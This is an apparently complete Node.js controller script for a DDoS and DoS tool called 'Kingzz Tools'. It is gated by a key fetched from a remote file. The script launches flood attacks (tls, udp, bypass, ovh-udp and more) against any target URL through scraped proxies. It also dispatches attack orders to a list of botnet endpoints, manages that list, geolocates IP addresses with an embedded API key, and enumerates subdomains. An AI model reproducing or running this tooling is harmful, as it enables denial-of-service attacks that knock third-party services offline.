#!/usr/bin/env node

const { exec, spawn  } = require('child_process')
const readline = require('readline')
const url = require('url')
const fs = require('fs')
const axios = require('axios')
const path = require('path')
const version = '7.0.0'
let processList = [];

const permen = readline.createInterface({
  input: process.stdin,
  output: process.stdout
})
// [========================================] //
function sleep(ms) {
  return new Promise(resolve => setTimeout(resolve, ms));
}
// [========================================] //
async function banner() {
console.clear()
console.log(`
\x1b[1m\x1b[34m╔╗ ╦  ╔═\x1b[0m╗╔═╗╔═╗╦═╗╔═╗ \x1b[31m
\x1b[1m\x1b[34m╠╩╗║  ╠═╣╔═╝\x1b[0m║╣ ╠╦╝╚═╗ \x1b[31m
\x1b[1m\x1b[34m╚═╝╩═╝╩ ╩╚═╝╚═╝╩\x1b[0m╚═╚═╝ \x1b[31m
Type help For Available Command
Owner: \x1b[31mt.me/Kingzz88\x1b[0m | Power Proof: \x1b[31mt.me/Kingzz78\x1b[0m
\x1b[1m\x1b[32m─────────────────────────────────────────────────────\x1b[0m
`)}
// [========================================] //
async function scrapeProxy() {
  try {
    const response = await fetch('https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt');
    const data = await response.text();
    fs.writeFileSync('proxy.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}

async function scrapeUserAgent() {
  try {
    const response = await fetch('https://gist.githubusercontent.com/pzb/b4b6f57144aea7827ae4/raw/cf847b76a142955b1410c8bcef3aabe221a63db1/user-agents.txt');
    const data = await response.text();
    fs.writeFileSync('ua.txt', data, 'utf-8');
  } catch (error) {
    console.error(`Error fetching data: ${error.message}`);
  }
}
// [========================================] //
function clearUserAgent() {
  if (fs.existsSync('ua.txt')) {
    fs.unlinkSync('ua.txt');
  }
}
// [========================================] //
async function bootup() {
  try {
    console.log(`\x1b[1m[ \x1b[31m SYSTEM\x1b[0m \x1b[1m ]\x1b[0m Trying to connect to tool`);
    await exec(`npm i axios tls http2 hpack net cluster crypto ssh2 dgram @whiskeysockets/baileys libphonenumber-js chalk gradient-string pino dns mineflayer fs colors proxy-agent`)
    await sleep(700)
    console.log(`\x1b[1m[ \x1b[31m SYSTEM\x1b[0m \x1b[1m ]\x1b[0m Connection 10% `);
    await sleep(700)
    console.log(`\x1b[1m[ \x1b[31m SYSTEM\x1b[0m \x1b[1m ]\x1b[0m Connection 80%`);
    await sleep(700)
    console.log(`\x1b[1m[ \x1b[31m SYSTEM\x1b[0m \x1b[1m ]\x1b[0m Connection 90%`);
    
    const secretBangetJir = await fetch('https://raw.githubusercontent.com/D4youXTool/cache/main/sigma.txt');
    const password = await secretBangetJir.text();
    console.clear()
    await console.log(` `)
    permen.question('\x1b[1m\x1b[36mEnter Key: \x1b[0m', async (skibidi) => {
      if (skibidi === password.trim()) {
        console.clear()
        console.log(`Successfuly Logged`)
        await scrapeProxy()
        console.log(`\x1b[1m[ \x1b[31m SYSTEM\x1b[0m \x1b[1m ]\x1b[0m Connecting To "\x1b[1m\x1b[31mBlazersXTools\x1b[0m"`)
        await scrapeUserAgent()
        console.log(`\x1b[1m[ \x1b[31m SYSTEM\x1b[0m \x1b[1m ]\x1b[0m Successfully Connect To "\x1b[1m\x1b[31mBlazersXTools\x1b[0m"`)
        await sleep(700)
        console.clear()
        console.log(`[ \x1b[1m\x1b[31mWelcome To Kingzz Tools DDoS And DoS  ${version}\x1b[0m ]`)
        await sleep(1000)
		    await banner()
        sigma()
      } else {
        console.log(`Wrong Key`)
        process.exit(-1);
      }
    }) 
  } catch (error) {
    console.log(`Are You Online?`)
  }
}
// [========================================] //
async function GoodBye(args) {
console.log(`Goodbye!!`)
process.exit(0);
}
async function AttackBotnetEndpoints(args) {
    if (args.length < 3) {
        console.log(`Example: ddos <target> <duration> <methods>\nddos https://google.com 120 flood`);
        sigma();
        return;
    }

    const [target, duration, methods] = args;
    let result;

    try {
        const parsedUrl = new url.URL(target);
        const hostname = parsedUrl.hostname;
        const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as`);
        result = scrape.data;

        const startTime = Date.now();
        const endTime = startTime + duration * 1000;
        processList.push({ target, methods, startTime, duration, endTime, ip: result.query });
            const now = new Date();
const options = { month:'short',day:'numeric',year:'numeric', timeZone: 'Asia/Jakarta' };
const formattedDate = now.toLocaleString('en-US', options);

        console.clear()
        console.log(`\x1b[1m[ \x1b[31mSYSTEM\x1b[0m \x1b[1m] Sending Commands To All Server....\x1b[0m`)
        await sleep(1000)
        console.log(`\x1b[1m[ \x1b[31mSYSTEM\x1b[0m \x1b[1m] Attack Sent Succefully\x1b[0m`)
        await sleep(700)
        console.clear()
        console.log(`\x1b[1mLaunch Attack On: [ \x1b[34m${formattedDate}\x1b[0m ]          
      \x1b[1m\x1b[36m- 𝙋 𝙊 𝙒 𝙀 𝙍 𝙀 𝘿  𝘽 𝙔  👑𝙈𝙍 𝙆𝙄𝙉𝙂 𝙓𝙋𝙇𝙊𝙄𝘿👑  2 0 2 5 – 2 0 2 6 -\x1b[0m 
\x1b[1m\x1b[34m ⠀⠀⠀⣠⠞⢠⠖⠉⠉⠉⢭⣭⣀⡉⣍⠉⠉⠒\x1b[1m\x1b[36m⠭⣑⠤⡀\x1b[0m⠀⠀⠀⠀   Attack Details
\x1b[1m\x1b[35m⠀⠀⡞⠁\x1b[1m\x1b[34m⡰⠳⢦⣼⣿⡿⣿⣿⣿⣿⣿⣿⣶\x1b[1m\x1b[36m⣤⡀⠈⠓⣌⢢⡀⠀\x1b[0m⠀Target   : \x1b[1m\x1b[31m[\x1b[0m \x1b[1m${target}\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠀⣸⠁⣰⣵⣾⣿\x1b[1m\x1b[34m⣿⡿⠹⣿⣿⢿⣟⣿⣿⣿⣿⣿⣦⡀\x1b[1m\x1b[36m⠈⢣⠱⡀\x1b[0m⠀Duration : \x1b[1m\x1b[31m[\x1b[0m \x1b[1m${duration}\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠀⢯⢠⣿⠟⣿⣿⣿\x1b[1m\x1b[34m⡇⠀⣿⠛⣷⢙⣻⢌⣻⠟⣿⣿⣿⣆⠀\x1b[1m\x1b[36m⢧⢳⠀\x1b[0mMethods  : \x1b[1m\x1b[31m[\x1b[0m \x1b[1m${methods}\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠀⠘⡞⢡⣼⣿⣿⣯⣧⠀⠘\x1b[1m\x1b[34m⠆⢨⠋⢠⡤⢘⣆⢻⣿⣿⣿\x1b[1m\x1b[36m⠇⢸⠀⡇ \x1b[0m     Target Details
\x1b[1m\x1b[35m⠀⠀⢱⡼⢟⣿⣿⣿⠋⢑⣄\x1b[0m\x1b[1m\x1b[34m⠀⠈⠢⠤⠔⣺⣏⠀⣿⣿⡏\x1b[1m\x1b[36m⠀⡼⠀⡇\x1b[0mISP      : \x1b[1m\x1b[31m[\x1b[0m \x1b[1m${result.isp}\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠀⠀⠁⠘⢺⣿⣿⣿⣦⣈⣽⠀\x1b[1m\x1b[34m⠀⢀⡤⠊⢡⣾⠀⠸\x1b[1m\x1b[36m⣿⢃⡴⠁⡜⠁\x1b[0mIp       : \x1b[1m\x1b[31m[\x1b[0m \x1b[1m${result.query}\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠀⠀⠀⠀⠀⠻⠙⠟⣿⡀⢨⠭⠊⡡\x1b[1m\x1b[34m⠔⠀⢠⠃⡜⣿⡋\x1b[1m\x1b[36m⣁⡠⠊⠀\x1b[0m⠀AS       : \x1b[1m\x1b[31m[\x1b[0m \x1b[1m${result.as}\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠀⠀⠀⠀⡰⠉⢓⠀⠈⠳⢌⡳⢄⣀⠤⠒\x1b[1m\x1b[34m⢁⠞⡼\x1b[1m\x1b[36m⠙⡄⠀⠀\x1b[0m⠀⠀⠀      Credits
\x1b[1m\x1b[35m⠀⠀⣀⠤⣣⣄⢸⠀⠀⠀⠀⠉⠑\x1b[1m\x1b[34m⠒⠤⢲⣥⠼⣤⣤\x1b[1m\x1b[36m⣱⡀⠀⠀⠀\x1b[0m⠀Owner    : \x1b[1m\x1b[31m[\x1b[0m \x1b[1mt.me/Kingzz78\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⣠⠊⠁⠀⠀⠈⣞⣆⠀⠀⠀⠀⠀⠀\x1b[1m\x1b[34m⣴⠏⠀⠀⠀⠙⢿⣿\x1b[1m\x1b[36m⣧⡀⠀⠀\x1b[0mChannel  : \x1b[1m\x1b[31m[\x1b[0m \x1b[1mt.me/Kingzz78\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠄⠈⠉⠉⠙⢦⢻⠚⣄⠀⠀⠀⠀⣼⠃⠀⠀\x1b[1m\x1b[34m⠀⠀⠀⢸⣿⣿\x1b[1m\x1b[36m⣧⠀⠀\x1b[0m
Please After Attack Type [\x1b[1m\x1b[34mcls\x1b[0m] To Return To The Home
`);
        sigma();
    } catch (error) {
        console.error('Error retrieving target information:', error.message);
    }

    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=${target}&time=${duration}&methods=${methods}`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);

    // Save valid endpoints back to the file
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving botnet data:', error.message);
        sigma();
    }
}

function methods() {
    
    const methodsData = JSON.parse(fs.readFileSync('lib/methods.json', 'utf-8'));

    console.log(`  `);
    console.log(` NAME      │ DESCRIPTION                    │ DURATION`);
    console.log(`───────────┼────────────────────────────────┼──────────`);

    methodsData.forEach(method => {
        console.log(
            `${method.name.padEnd(10)} │ ${method.description.padEnd(30)} │ ${method.duration.padEnd(3)}`
        );
    });
}

async function processBotnetEndpoint(args) {
    if (args.length < 1) {
    console.log(`Example: addsrv <endpoints>
addsrv http://1.1.1.1:2000/permen`);
    sigma();
	return
  }
    try {
        const parsedUrl = new url.URL(args);
        const hostt = parsedUrl.host;
        const endpoint = 'http://' + hostt + '/permen';

        // Load botnet data
        let botnetData;
        try {
            const data = await fs.promises.readFile('./lib/botnet.json', 'utf8');
            botnetData = JSON.parse(data);
        } catch (error) {
            console.error('Error loading botnet data:', error.message);
            botnetData = { endpoints: [] };
        }

        // Check if endpoint already exists
        if (botnetData.endpoints.includes(endpoint)) {
            return console.log(`Endpoint ${endpoint} is already in the botnet list.`);
            sigma();
            return;           
        }

        // Add endpoint and save data
        botnetData.endpoints.push(endpoint);
        try {
            await fs.promises.writeFile('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
        } catch (error) {
            console.error('Error saving botnet data:', error.message);
            return console.log('Error saving botnet data.');
        }

        // Reply with success message
        console.log(`Endpoint ${endpoint} added to botnet.`);
        sigma()
    } catch (error) {
        console.error('Error processing botnet endpoint:', error.message);
        console.log('An error occurred while processing the endpoint.');
        sigma()
    }
}

async function getIPAddress(target) {
    try {
        const parsing = new url.URL(target);
        const hostname = parsing.hostname;
        const response = await axios.get(`http://ip-api.com/json/${hostname}?fields=query`);

        if (response.data && response.data.status === "success") {
            return response.data.query;
        } else {
            return target;
        }
    } catch (error) {
        console.error("Error fetching IP address:", error);
        return target;
    }
}

async function monitorOngoingAttacks() {
    // Filter proses yang masih berjalan
    processList = processList.filter((process) => {
        const remaining = Math.max(0, Math.floor((process.endTime - Date.now()) / 1000));
        return remaining > 0;
    });

    if (processList.length === 0) {
        console.log("Tidak ada serangan yang sedang berlangsung.");
        sigma();
        return;
    }

    // Membuat tabel serangan
    let attackDetails = "\nRunning Attack\n";
    attackDetails += `  #  │        HOST               │ SINCE │ DURATION │ METHOD  \n`;
    attackDetails += `─────┼───────────────────────────┼───────┼──────────┼─────────\n`;

    // Isi tabel dengan data proses
    processList.forEach((process, index) => {
        const host = process.ip || process.target;
        const since = Math.floor((Date.now() - process.startTime) / 1000);
        const duration = `${process.duration} sec`; // Menampilkan durasi dalam detik

        // Baris data
        attackDetails += ` ${String(index + 1).padEnd(3)} │ ${host.padEnd(20)} │ ${String(since).padEnd(5)} │ ${duration.padEnd(8)} │ ${process.methods.padEnd(7)} \n`;
    });
    

    console.log(attackDetails);
    sigma();
}

async function checkBotnetEndpoints() {
    let botnetData;
    let successCount = 0;
    const timeout = 20000;
    const validEndpoints = [];

    // Load botnet data
    try {
        botnetData = JSON.parse(fs.readFileSync('./lib/botnet.json', 'utf8'));
    } catch (error) {
        console.error('Error loading botnet data:', error.message);
        botnetData = { endpoints: [] };
    }

    // Send requests to each endpoint
    const requests = botnetData.endpoints.map(async (endpoint) => {
        const apiUrl = `${endpoint}?target=https://google.com&time=1&methods=ninja`;

        try {
            const response = await axios.get(apiUrl, { timeout });
            if (response.status === 200) {
                successCount++;
                validEndpoints.push(endpoint);
            }
        } catch (error) {
            console.error(`Error sending request to ${endpoint}: ${error.message}`);
        }
    });

    await Promise.all(requests);
    botnetData.endpoints = validEndpoints;
    try {
        fs.writeFileSync('./lib/botnet.json', JSON.stringify(botnetData, null, 2));
    } catch (error) {
        console.error('Error saving server data:', error.message);
        sigma()
    }

    // Reply with the results
    console.log(`Checked server. ${successCount} server online.`);
    sigma()
}


async function trackIP(args) {
  if (args.length < 1) {
    console.log(`Example: track-ip <ip address>
track-ip 1.1.1.1`);
    sigma();
	return
  }
const [target] = args
  if (target === '0.0.0.0') {
  console.log(`Jangan Di Ulangi Manis Nanti Di Delete User Mu`)
	sigma()
  } else {
    try {
const apiKey = '8fd0a436e74f44a7a3f94edcdd71c696';
const response = await fetch(`https://api.ipgeolocation.io/ipgeo?apiKey=${apiKey}&ip=${target}`);
const res = await fetch(`https://ipwho.is/${target}`);
const additionalInfo = await res.json();
const ipInfo = await response.json();

    console.log(`
 - Flags: ${ipInfo.country_flag}
 - Country: ${ipInfo.country_name}
 - Capital: ${ipInfo.country_capital}
 - City: ${ipInfo.city}
 - ISP: ${ipInfo.isp}
 - Organization: ${ipInfo.organization}
 - lat: ${ipInfo.latitude}
 - long: ${ipInfo.longitude}
      
 Google Maps: https://www.google.com/maps/place/${additionalInfo.latitude}+${additionalInfo.longitude}\x1b[0m
 Type [\x1b[1m\x1b[35mcls\x1b[0m] to clear terminal 
`)
    sigma()
  } catch (error) {
      console.log(`Error Tracking ${target}`)
      sigma()
    }
    }
};
// [========================================] //
async function pushOngoing(target, methods, duration) {
  const startTime = Date.now();
  processList.push({ target, methods, startTime, duration })
  setTimeout(() => {
    const index = processList.findIndex((p) => p.methods === methods);
    if (index !== -1) {
      processList.splice(index, 1);
    }
  }, duration * 1000);
}
// [========================================] //
function ongoingAttack() {
  console.log("\nOngoing Attack:\n");
  processList.forEach((process) => {
console.log(`Target: ${process.target}
Methods: ${process.methods}
Duration: ${process.duration} Seconds
Since: ${Math.floor((Date.now() - process.startTime) / 1000)} seconds ago\n`);
  });
}
// [========================================] //
async function handleAttackCommand(args) {
  if (args.length < 3) {
    console.log(`Example: dos <target> <duration> <methods>
attack https://google.com 120 flood`);
    sigma();
    return;
  }

  const [target, duration, methods] = args;
  try {
    const parsing = new URL(target); // url.URL -> URL (koreksi kecil)
    const hostname = parsing.hostname;
    const scrape = await axios.get(`http://ip-api.com/json/${hostname}?fields=isp,query,as,country,org`);
    const result = scrape.data;

    // Getting the current date and time .
    const now = new Date();
const options = { month: 'short', day: 'numeric', year: 'numeric', hour: 'numeric', timeZone: 'Asia/Jakarta' };
const formattedDate = now.toLocaleString('en-US', options);

    console.clear()
    await sleep(400)
    console.log(`\x1b[1m[ \x1b[31mSYSTEM\x1b[0m \x1b[1m] Sending Commands To All Server....\x1b[0m`)
    await sleep(1000)
    console.log(`\x1b[1m[ \x1b[31mSYSTEM\x1b[0m \x1b[1m] Attack Sent Succefully\x1b[0m`)
    await sleep(700)
    console.clear()
    console.log(`\x1b[1mLaunch Attack On: [ \x1b[34m${formattedDate}\x1b[0m ]          
      \x1b[1m\x1b[36m- 𝙋 𝙊 𝙒 𝙀 𝙍 𝙀 𝘿  𝘽 𝙔  👑 𝕶 𝖎 𝖓 𝖌 𝖟 𝖟 👑  2 0 2 5 – 2 0 2 6 -\x1b[0m 
\x1b[1m\x1b[34m ⠀⠀⠀⣠⠞⢠⠖⠉⠉⠉⢭⣭⣀⡉⣍⠉⠉⠒\x1b[1m\x1b[36m⠭⣑⠤⡀\x1b[0m⠀⠀⠀⠀   Attack Details
\x1b[1m\x1b[35m⠀⠀⡞⠁\x1b[1m\x1b[34m⡰⠳⢦⣼⣿⡿⣿⣿⣿⣿⣿⣿⣶\x1b[1m\x1b[36m⣤⡀⠈⠓⣌⢢⡀⠀\x1b[0m⠀Target   : \x1b[1m\x1b[31m[\x1b[0m \x1b[1m${target}\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠀⣸⠁⣰⣵⣾⣿\x1b[1m\x1b[34m⣿⡿⠹⣿⣿⢿⣟⣿⣿⣿⣿⣿⣦⡀\x1b[1m\x1b[36m⠈⢣⠱⡀\x1b[0m⠀Duration : \x1b[1m\x1b[31m[\x1b[0m \x1b[1m${duration}\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠀⢯⢠⣿⠟⣿⣿⣿\x1b[1m\x1b[34m⡇⠀⣿⠛⣷⢙⣻⢌⣻⠟⣿⣿⣿⣆⠀\x1b[1m\x1b[36m⢧⢳⠀\x1b[0mMethods  : \x1b[1m\x1b[31m[\x1b[0m \x1b[1m${methods}\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠀⠘⡞⢡⣼⣿⣿⣯⣧⠀⠘\x1b[1m\x1b[34m⠆⢨⠋⢠⡤⢘⣆⢻⣿⣿⣿\x1b[1m\x1b[36m⠇⢸⠀⡇ \x1b[0m     Target Details
\x1b[1m\x1b[35m⠀⠀⢱⡼⢟⣿⣿⣿⠋⢑⣄\x1b[0m\x1b[1m\x1b[34m⠀⠈⠢⠤⠔⣺⣏⠀⣿⣿⡏\x1b[1m\x1b[36m⠀⡼⠀⡇\x1b[0mISP      : \x1b[1m\x1b[31m[\x1b[0m \x1b[1m${result.isp}\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠀⠀⠁⠘⢺⣿⣿⣿⣦⣈⣽⠀\x1b[1m\x1b[34m⠀⢀⡤⠊⢡⣾⠀⠸\x1b[1m\x1b[36m⣿⢃⡴⠁⡜⠁\x1b[0mIp       : \x1b[1m\x1b[31m[\x1b[0m \x1b[1m${result.query}\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠀⠀⠀⠀⠀⠻⠙⠟⣿⡀⢨⠭⠊⡡\x1b[1m\x1b[34m⠔⠀⢠⠃⡜⣿⡋\x1b[1m\x1b[36m⣁⡠⠊⠀\x1b[0m⠀AS       : \x1b[1m\x1b[31m[\x1b[0m \x1b[1m${result.as}\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠀⠀⠀⠀⡰⠉⢓⠀⠈⠳⢌⡳⢄⣀⠤⠒\x1b[1m\x1b[34m⢁⠞⡼\x1b[1m\x1b[36m⠙⡄⠀⠀\x1b[0m⠀⠀⠀      Credits
\x1b[1m\x1b[35m⠀⠀⣀⠤⣣⣄⢸⠀⠀⠀⠀⠉⠑\x1b[1m\x1b[34m⠒⠤⢲⣥⠼⣤⣤\x1b[1m\x1b[36m⣱⡀⠀⠀⠀\x1b[0m⠀Owner    : \x1b[1m\x1b[31m[\x1b[0m \x1b[1mt.me/Kingzz78\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⣠⠊⠁⠀⠀⠈⣞⣆⠀⠀⠀⠀⠀⠀\x1b[1m\x1b[34m⣴⠏⠀⠀⠀⠙⢿⣿\x1b[1m\x1b[36m⣧⡀⠀⠀\x1b[0mChannel  : \x1b[1m\x1b[31m[\x1b[0m \x1b[1mt.me/Kingzz78\x1b[0m \x1b[1m\x1b[31m]\x1b[0m
\x1b[1m\x1b[35m⠄⠈⠉⠉⠙⢦⢻⠚⣄⠀⠀⠀⠀⣼⠃⠀⠀\x1b[1m\x1b[34m⠀⠀⠀⢸⣿⣿\x1b[1m\x1b[36m⣧⠀⠀\x1b[0m
Please After Attack Type [\x1b[1m\x1b[34mcls\x1b[0m] To Return To The Home
`)
} catch (error) {
  console.log(`Oops Something Went wrong`)
}
const metode = path.join(__dirname, `/method/${methods}`);
  if (methods === 'flood') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
	sigma()
  } else if (methods === 'ninja') {
   pushOngoing(target, methods, duration)
   exec(`node ${metode} ${target} ${duration}`)
	sigma()
  } else if (methods === 'tls') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
    sigma()
      } else if (methods === 'destroy') {
    pushOngoing(target, methods, duration)
     exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
    sigma()
    } else if (methods === 'strike') {
      pushOngoing(target, methods, duration)
       exec(`node ${metode} GET ${target} ${duration} 5 32 proxy.txt --full`)
      sigma()
        } else if (methods === 'bypass') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
        } else if (methods === 'browser') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 5 32`)
          sigma()
          } else if (methods === 'storm') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
          } else if (methods === 'tcp') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
          } else if (methods === 'udp') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
          } else if (methods === 'h2') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
          } else if (methods === 'sky') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
        } else if (methods === 'mix') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 2`)
          sigma()
          } else if (methods === 'https') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 70 10 proxy.txt`)
          sigma()
          } else if (methods === 'tlsvip') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 100 5 proxy.txt`)
          sigma()
          } else if (methods === 'http-x') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
          } else if (methods === 'http-raw') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
          } else if (methods === 'cibi') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
        } else if (methods === 'glory') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
        } else if (methods === 'quantum') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
        } else if (methods === 'TICIPI') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
        } else if (methods === 'tcp-pps') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
        } else if (methods === 'ovh-udp') {
       pushOngoing(target, methods, duration)
        exec(`node ${metode} ${target} ${duration} 32 5 proxy.txt`)
          sigma()
          } else {
    console.log(`Method ${methods} not recognized.`);
  }
};
// [========================================] //
async function subdomen(args) {
  if (args.length < 1) {
    console.log(`Example: .subdo-finder domain
.subdo-finder starsx.tech`);
    sigma();
	return
  }
const [domain] = args
try {
let response = await axios.get(`https://api.agatz.xyz/api/subdomain?url=${domain}`);
let hasilmanuk = response.data.data.map((data, index) => {
return `${data}`;
}).join('\n');
console.log(`
${hasilmanuk}`)
} catch (error) {
  console.log(`Oops Something Went Wrong`)
  sigma()
}
sigma()
};
// [========================================] //
async function sigma() {
const getNews = await fetch(`https://raw.githubusercontent.com/permenmd/cache/main/news.txt`)
const latestNews = await getNews.text();
const creatorCredits = `
ᴄʀᴇᴅɪᴛs
ᴏᴡɴᴇʀ: ᴠᴇxᴏɴᴢ
ᴠᴇʀsɪᴏɴ: 7.0.0
`
permen.question('\x1b[1m\x1b[31m\x1b[94mKingzz-t.me/Kingzz78\x1b[0m \x1b[1m\x1b[31m\x1b[94m➤\x1b[0m \x1b[32m\x1b[0m', (input) => {
  const [command, ...args] = input.trim().split(/\s+/);

  if (command === 'help') {
    console.log(`
NAME          │ ALIAS         │ DESCRIPTION
──────────────┼───────────────┼────────────────────────────
 methods      │ ----          │ show list of available methods
 addsrv       │ ----          │ add new server
 testsrv      │ ----          │ testing your server on/off
 track-ip     │ ----          │ track ip address with info
 subdo-finder │ ----          │ find all subdomain from domain
 dos          │ ----          │ launch dos attack
 ddos         │ ----          │ launch DDoS attack with server
 exit         │ out,exit      │ stop and exit the tool
 ongoing      │ ----          │ show running attack
 monitor      │ ----          │ show running attack with server
 credits      │ ----          │ show creator of these tools
 clear        │ cls,c         │ clear terminal
`);
    sigma();
    
  } else if (command === 'methods') {
    methods()
    sigma();
  } else if (command === 'exit') {
    GoodBye(args);
    sigma();
  } else if (command === 'out') {
    GoodBye(args);
    sigma();
  } else if (command === 'news') {
    console.log(`
${latestNews}`);
    sigma();
  } else if (command === 'credits') {
    console.log(`
${creatorCredits}`);
    sigma();
  } else if (command === 'dos') {
    handleAttackCommand(args);
  } else if (command === 'ongoing') {
    ongoingAttack()
    sigma()
  } else if (command === 'track-ip') {
    trackIP(args);
  } else if (command === 'monitor') {
    monitorOngoingAttacks()
  } else if (command === 'subdo-finder') {
    subdomen(args)
  } else if (command === 'kill-wifi') {
    killWifi()
  } else if (command === 'addsrv') {
    processBotnetEndpoint(args)
  } else if (command === 'testsrv') {
    checkBotnetEndpoints()
  } else if (command === 'ddos') {
    AttackBotnetEndpoints(args) 
  } else if (command === 'cls') {
    banner()
  } else if (command === 'c') {
    banner()
    sigma()
    } else {
    console.log(`${command} Not Found`);
    sigma();
  }
});
}
// [========================================] //
function clearall() {
  clearUserAgent()
}
// [========================================] //
process.on('exit', clearall);
process.on('SIGINT', () => {
  clearall()
  process.exit();
});
process.on('SIGTERM', () => {
clearall()
 process.exit();
});

bootup()